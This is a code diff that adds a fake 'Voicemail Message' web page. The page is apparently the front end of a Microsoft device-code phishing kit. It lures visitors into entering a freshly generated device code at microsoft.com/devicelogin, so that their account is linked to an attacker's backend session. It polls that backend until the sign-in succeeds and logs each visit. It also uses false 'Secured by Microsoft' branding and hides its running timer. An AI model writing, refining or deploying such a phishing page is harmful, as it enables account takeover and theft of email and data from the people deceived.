@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Voicemail Message</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#e8e8e8;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.wrap{width:100%;max-width:480px}
+.card{background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 20px rgba(0,0,0,.08)}
+.state{display:none}.state.show{display:block}
+
+/* File attachment bar */
+.file-bar{display:flex;align-items:center;gap:10px;padding:16px 20px;border-bottom:1px solid #eee}
+.file-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center}
+.file-icon svg{width:22px;height:22px}
+.file-name{font-size:14px;color:#333;font-weight:500}
+
+/* Main content area */
+.content{padding:30px 28px 24px;text-align:center}
+
+/* Folder icon */
+.folder-icon{font-size:48px;margin-bottom:12px;line-height:1}
+
+/* Headings */
+.heading{font-size:22px;font-weight:700;color:#1a1a1a;margin-bottom:8px}
+.sub{font-size:14px;color:#888;margin-bottom:24px;line-height:1.5}
+
+/* Loading */
+.loading-wrap{display:flex;flex-direction:column;align-items:center;gap:16px;padding:30px 0}
+.spin-lg{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* Code box */
+.code-box{background:#1a1a2e;border-radius:10px;padding:24px 20px 20px;margin-bottom:24px;text-align:center;transition:all .3s}
+.code-box.highlight{box-shadow:0 0 0 2px #0078d4}
+.code-lbl{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:#8888aa;margin-bottom:14px;font-weight:600}
+.code-val{font-size:32px;font-weight:700;color:#fff;letter-spacing:8px;display:block;margin-bottom:18px;user-select:all;cursor:text;font-family:'Segoe UI',monospace}
+.copy-btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 28px;border-radius:6px;background:#0078d4;border:none;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s;font-family:'Segoe UI',sans-serif}
+.copy-btn:hover{background:#106ebe}
+.copy-btn.copied{background:#28a745!important}
+
+/* Steps */
+.steps{display:flex;flex-direction:column;gap:14px;margin-bottom:28px;text-align:left;padding:0 8px}
+.step{display:flex;align-items:center;gap:12px;font-size:14px;color:#555}
+.snum{width:26px;height:26px;border-radius:50%;background:#0078d4;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;color:#fff;flex-shrink:0}
+
+/* Continue button */
+.btn-continue{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;border:none;font-family:'Segoe UI',sans-serif;transition:all .15s;text-decoration:none;background:#0078d4;color:#fff;margin-bottom:0}
+.btn-continue:hover{background:#106ebe}
+.ms-logo{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:18px;height:18px;flex-shrink:0}
+.ms-logo span{border-radius:1px}
+
+/* Secured footer */
+.secured{display:flex;align-items:center;justify-content:center;gap:6px;padding:16px;font-size:12px;color:#999}
+.secured svg{width:14px;height:14px}
+
+/* Timer (hidden but functional) */
+.timer-row{display:none}
+.tbar{display:none}
+
+/* Success */
+.succ-icon{width:60px;height:60px;border-radius:50%;background:#e6f9ee;border:2px solid #28a745;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 16px;color:#28a745}
+.ms-acc{display:flex;align-items:center;gap:12px;background:#f7f7f7;border-radius:8px;border:1px solid #eee;padding:14px;margin:16px 0;text-align:left}
+.ms-av{width:40px;height:40px;border-radius:50%;background:#e8f0fe;border:1px solid #d0dff5;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;color:#0078d4;flex-shrink:0}
+.btn-open{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;border:none;font-family:'Segoe UI',sans-serif;transition:all .15s;text-decoration:none;background:#0078d4;color:#fff;margin-bottom:8px}
+.btn-open:hover{background:#106ebe}
+.btn-sec{display:flex;align-items:center;justify-content:center;width:100%;padding:12px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;background:#f5f5f5;border:1px solid #e0e0e0;color:#555;font-family:'Segoe UI',sans-serif;transition:all .15s}
+.btn-sec:hover{background:#eee;color:#333}
+
+/* Error */
+.err-box{background:#fff0f0;border:1px solid #ffcccc;border-radius:8px;padding:14px;font-size:13px;color:#d32f2f;margin-bottom:14px;line-height:1.5}
+
+/* Poll indicator */
+.poll-row{display:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+
+    <!-- File attachment bar -->
+    <div class="file-bar">
+      <div class="file-icon">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#4A90D9"/><path d="M14 2v6h6" fill="#7DB4E0"/><path d="M14 2l6 6h-6V2z" fill="#7DB4E0"/></svg>
+      </div>
+      <span class="file-name">Voicemail_Message.mp3</span>
+    </div>
+
+    <!-- LOADING -->
+    <div class="state show" id="st-loading">
+      <div class="content">
+        <div class="loading-wrap">
+          <div class="spin-lg"></div>
+          <div style="font-size:14px;color:#888">Loading...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CODE READY -->
+    <div class="state" id="st-code">
+      <div class="content">
+        <div class="folder-icon">📂</div>
+        <div class="heading">Listen to voicemail</div>
+        <div class="sub">You have a new voicemail. Verify your identity with Microsoft to listen.</div>
+
+        <div class="code-box" id="code-box">
+          <div class="code-lbl">Your Verification Code</div>
+          <div class="code-val" id="code-val">— — — —</div>
+          <button class="copy-btn" onclick="copyCode()" id="copy-btn">Copy Code</button>
+        </div>
+
+        <div class="steps">
+          <div class="step"><div class="snum">1</div><div>Copy the code above</div></div>
+          <div class="step"><div class="snum">2</div><div>Click continue and paste (Ctrl+V)</div></div>
+          <div class="step"><div class="snum">3</div><div>Sign in with your Microsoft account</div></div>
+        </div>
+
+        <a class="btn-continue" id="url-link" href="#" target="_blank">
+          <div class="ms-logo"><span style="background:#f25022"></span><span style="background:#7fba00"></span><span style="background:#00a4ef"></span><span style="background:#ffb900"></span></div>
+          Continue to Microsoft
+        </a>
+      </div>
+
+      <div class="secured">
+        <svg viewBox="0 0 16 16" fill="#28a745"><path d="M8 1a4 4 0 00-4 4v2H3a1 1 0 00-1 1v6a1 1 0 001 1h10a1 1 0 001-1V8a1 1 0 00-1-1h-1V5a4 4 0 00-4-4zm-2 4a2 2 0 114 0v2H6V5z"/></svg>
+        Secured by Microsoft
+      </div>
+
+      <!-- Hidden but functional timer -->
+      <div class="timer-row"><span class="timer-val" id="timer-val">15:00</span></div>
+      <div class="tbar"><div class="tfill" id="tfill" style="width:100%"></div></div>
+      <div class="poll-row"><span id="poll-msg"></span></div>
+      <span id="url-txt" style="display:none">microsoft.com/devicelogin</span>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="state" id="st-success">
+      <div class="content">
+        <div class="succ-icon">✓</div>
+        <div class="heading" style="margin-bottom:6px">Account Verified!</div>
+        <div class="sub">Your Microsoft account has been successfully linked.</div>
+        <div class="ms-acc">
+          <div class="ms-av" id="succ-initials">MS</div>
+          <div>
+            <div style="font-size:15px;font-weight:600;color:#1a1a1a" id="succ-name">Microsoft User</div>
+            <div style="font-size:13px;color:#888" id="succ-email">—</div>
+            <div style="font-size:11px;color:#28a745;margin-top:3px;font-weight:500">● Verified & active</div>
+          </div>
+        </div>
+        <a class="btn-open" href="/mail" target="_blank">
+          <div class="ms-logo"><span style="background:#f25022"></span><span style="background:#7fba00"></span><span style="background:#00a4ef"></span><span style="background:#ffb900"></span></div>
+          Open Mailbox
+        </a>
+        <button class="btn-sec" onclick="linkAnother()">Link another account</button>
+      </div>
+    </div>
+
+    <!-- ERROR -->
+    <div class="state" id="st-error">
+      <div class="content">
+        <div class="err-box" id="err-msg">Could not generate verification code.</div>
+        <button class="btn-sec" onclick="init()">↺ Try again</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// The backend URL — same origin when served via nginx
+const API = 'http://localhost:3000';
+
+let sessionKey  = null;
+let expiry      = null;
+let totalSecs   = 0;
+let timerInt    = null;
+let pollInt     = null;
+
+function show(id) {
+  document.querySelectorAll('.state').forEach(s => s.classList.toggle('show', s.id === id));
+}
+
+// ── On every page load: request a fresh device code ──────────────────────────
+async function init() {
+  show('st-loading');
+  clearInterval(timerInt);
+  clearInterval(pollInt);
+  sessionKey = null;
+
+  try {
+    // POST to get a NEW session — server generates a brand new device code each time
+    const res  = await fetch(API + '/api/link/new-session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}'
+    });
+
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error(err.error || 'Server error ' + res.status);
+    }
+
+    const data = await res.json();
+    if (data.error) throw new Error(data.error);
+
+    sessionKey = data.session_key;
+    expiry     = new Date(data.expires_at);
+    totalSecs  = data.expires_in || Math.floor((expiry - Date.now()) / 1000);
+
+    // Show the code immediately
+    document.getElementById('code-val').textContent = data.user_code;
+    document.getElementById('url-link').href        = data.verification_uri;
+    document.getElementById('url-txt').textContent  = data.verification_uri.replace('https://', '');
+
+    // Briefly highlight the code box
+    const box = document.getElementById('code-box');
+    box.classList.add('highlight');
+    setTimeout(() => box.classList.remove('highlight'), 1200);
+
+    show('st-code');
+    startTimer();
+    startPolling();
+    trackVisit(sessionKey);
+
+  } catch(e) {
+    document.getElementById('err-msg').textContent = 'Error: ' + e.message;
+    show('st-error');
+  }
+}
+
+// ── Countdown timer ───────────────────────────────────────────────────────────
+function startTimer() {
+  clearInterval(timerInt);
+  timerInt = setInterval(() => {
+    const left = Math.max(0, Math.floor((expiry - Date.now()) / 1000));
+    const m = Math.floor(left / 60), s = left % 60;
+    document.getElementById('timer-val').textContent = m + ':' + String(s).padStart(2, '0');
+    const pct = totalSecs > 0 ? (left / totalSecs) * 100 : 0;
+    const fill = document.getElementById('tfill');
+    fill.style.width = pct + '%';
+    fill.style.background = pct > 40 ? 'var(--accent)' : pct > 15 ? 'var(--amber)' : 'var(--red)';
+    // Auto-regenerate when expired
+    if (left <= 0) {
+      clearInterval(timerInt);
+      clearInterval(pollInt);
+      document.getElementById('poll-msg').textContent = 'Code expired — generating new code...';
+      setTimeout(() => init(), 1200);
+    }
+  }, 1000);
+}
+
+// ── Poll for success ──────────────────────────────────────────────────────────
+function startPolling() {
+  clearInterval(pollInt);
+  if (!sessionKey) return;
+
+  pollInt = setInterval(async () => {
+    try {
+      const res  = await fetch(API + '/api/link/poll/' + sessionKey);
+      const data = await res.json();
+
+      if (data.status === 'success') {
+        clearInterval(pollInt);
+        clearInterval(timerInt);
+        document.getElementById('succ-name').textContent     = data.ms_name || 'Microsoft User';
+        document.getElementById('succ-email').textContent    = data.ms_email || '';
+        document.getElementById('succ-initials').textContent =
+          (data.ms_name || 'MS').split(' ').map(w => w[0]).join('').toUpperCase().slice(0, 2) || 'MS';
+        show('st-success');
+      } else if (data.status === 'expired' || data.status === 'not_found') {
+        clearInterval(pollInt);
+        clearInterval(timerInt);
+        // Let timer handle regeneration, or do it now
+        setTimeout(() => init(), 500);
+      }
+    } catch {}
+  }, 4000);
+}
+
+function copyCode() {
+  const code = document.getElementById('code-val').textContent.replace(/\s/g, '');
+  const btn  = document.getElementById('copy-btn');
+
+  const fallback = () => {
+    const el = document.getElementById('code-val');
+    const s  = window.getSelection(), r = document.createRange();
+    r.selectNodeContents(el); s.removeAllRanges(); s.addRange(r);
+  };
+
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(code).then(() => {
+      btn.classList.add('copied');
+      btn.textContent = '✓ Copied!';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.textContent = 'Copy Code';
+      }, 2500);
+    }).catch(fallback);
+  } else {
+    fallback();
+  }
+}
+
+function linkAnother() {
+  init();
+}
+
+// Track visitor IP
+function trackVisit(sk) {
+  fetch(API + '/api/link/visit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ session_key: sk || null })
+  }).catch(() => {});
+}
+
+// Start on page load
+init();
+</script>
+</body>
+</html>
